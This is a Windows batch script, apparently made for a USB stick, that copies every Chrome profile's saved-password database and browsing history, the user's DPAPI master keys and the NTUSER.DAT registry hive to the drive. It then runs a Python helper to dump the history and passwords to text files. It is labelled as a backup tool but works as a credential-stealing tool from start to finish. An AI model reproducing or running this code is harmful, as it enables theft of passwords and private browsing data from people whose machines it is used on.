	@echo off
	title Tool By - Muhammad Ahmed Naveed
	chcp 65001 > nul
	mode con: cols=120 lines=30

	echo.
	echo [31m=============================================================[0m [33m[ %date%  -  %time% ][0m [31m==========================[0m
	echo.

echo ██   ██ ██ ███████ ████████  ██████  ██████  ██    ██     
echo ██   ██ ██ ██         ██    ██    ██ ██   ██  ██  ██      
echo ███████ ██ ███████    ██    ██    ██ ██████    ████       
echo ██   ██ ██      ██    ██    ██    ██ ██   ██    ██        
echo ██   ██ ██ ███████    ██     ██████  ██   ██    ██        
echo.                                                          
echo.                                                     
echo     ██████ ██   ██ ██████   ██████  ███    ███ ███████   
echo    ██      ██   ██ ██   ██ ██    ██ ████  ████ ██        
echo    ██      ███████ ██████  ██    ██ ██ ████ ██ █████     
echo    ██      ██   ██ ██   ██ ██    ██ ██  ██  ██ ██        
echo     ██████ ██   ██ ██   ██  ██████  ██      ██ ███████   
                                                          
                                                          
	echo.

	:: Set paths
	set "chromeData=%LOCALAPPDATA%\Google\Chrome\User Data"
	set "backupFolder=%CD%\Chrome_Profile_Backups"
	set "USB_DRIVE=%~d0"
	set "extractDir=%USB_DRIVE%\Extracted_Data"
	set "reportDir=%extractDir%\Reports"

	if not exist "%backupFolder%" mkdir "%backupFolder%"
	if not exist "%extractDir%" mkdir "%extractDir%"
	if not exist "%reportDir%" mkdir "%reportDir%"

	echo [*] Backing up Chrome profiles locally...

	:: Backup Default + all Profile folders locally
	for %%p in ("Default") do (
		call :CopyProfileData "%%~p" "%backupFolder%"
	)
	for /d %%d in ("%chromeData%\Profile *") do (
		call :CopyProfileData "%%~nxd" "%backupFolder%"
	)

	echo [*] Copying Chrome profiles and DPAPI data to USB...

	:: Copy Default profile Login Data and History to USB
	copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%extractDir%\Chrome\Default\" /Y /I
	copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" "%extractDir%\Chrome\Default\" /Y /I

	:: Copy all other Chrome profiles Login Data and History to USB
	for /d %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\Profile*") do (
		xcopy "%%P\Login Data" "%extractDir%\Chrome\%%~nxP\" /Y /I
		xcopy "%%P\History" "%extractDir%\Chrome\%%~nxP\" /Y /I
	)	

	echo  [33m[*] Copying DPAPI Master Keys to USB... [0m
	xcopy "%APPDATA%\Microsoft\Protect" "%extractDir%\DPAPI_Protect" /E /I /Y


	echo  [33m[*] Copying NTUSER.DAT registry hive to USB...  [0m
	copy "%userprofile%NTUSER.DAT" "%extractDir%\NTUSER.DAT" /Y
	 
	echo [*] Exporting Chrome History to text...
	python Scraping_Extracting.py "%extractDir%\Chrome" > "%reportDir%\chrome_history.txt"
	 
	echo [*] Exporting Chrome Passwords to text...
	python Scraping_Extracting.py "%extractDir%\Chrome" > "%reportDir%\chrome_passwords.txt"

	echo  [92m[✓] Extraction complete! Data saved to:
	echo     Local backups: %backupFolder%
	echo     USB Extracted Data: %extractDir%
	echo     Reports: %reportDir%
	echo  [0m
	echo.
	call Main.bat
	exit /b

	:CopyProfileData
	setlocal
	set "profile=%~1"            
	set "destFolder=%~2"
	set "loginSrc=%chromeData%\%profile%\Login Data"
	set "historySrc=%chromeData%\%profile%\History"
	set "loginDst=%destFolder%\LoginData_%profile%.sqlite"
	set "historyDst=%destFolder%\History_%profile%.sqlite"

	:: Copy Login Data
	if exist "%loginSrc%" (
		echo  [33m[*] Backing up Login Data: %profile% [0m
		copy "%loginSrc%" "%loginDst%" > nul
		if exist "%loginDst%" (
			echo [92m[+] Copied Login Data to: %loginDst% [0m
		) else (
			echo  [31m[-] Failed to copy Login Data: %profile% [0m
		)
	) else (
		echo [31m [-] Login Data not found for profile: %profile% [0m
	)

	:: Copy History
	if exist "%historySrc%" (
		echo  [33m[*] Backing up History: %profile% [0m
		copy "%historySrc%" "%historyDst%" > nul
		if exist "%historyDst%" (
			echo  [92m[+] Copied History to: %historyDst% [0m
		) else (
			echo  [31m[-] Failed to copy History: %profile%  [0m
		)
	) else (
		echo  [31m[-] History not found for profile: %profile% [0m
	)

	endlocal
	exit /b
